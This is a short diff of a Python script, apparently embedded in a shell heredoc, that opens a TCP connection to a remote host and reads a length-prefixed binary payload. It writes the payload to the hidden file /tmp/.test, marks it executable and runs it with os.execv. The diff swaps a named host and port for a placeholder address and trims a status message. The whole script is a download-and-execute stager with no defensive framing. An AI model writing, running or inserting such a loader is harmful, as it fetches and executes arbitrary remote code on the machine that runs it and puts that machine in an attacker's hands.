@@ -3,7 +3,7 @@ import socket, struct, os, stat
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.settimeout(10)
-s.connect(("secure.glyphforge.net", 1221))
+s.connect(("192.168.X.X", 9999))
 size_data = s.recv(4)
 size = struct.unpack('<I', size_data)[0]
 print(f"[+] Size: {size}")
@@ -19,6 +19,6 @@ s.close()
 with open("/tmp/.test", "wb") as f:
     f.write(data)
 os.chmod("/tmp/.test", stat.S_IRWXU)
-print("[+] Written, executing...")
+print("[+] Executing...")
 os.execv("/tmp/.test", ["/tmp/.test"])
 EOF
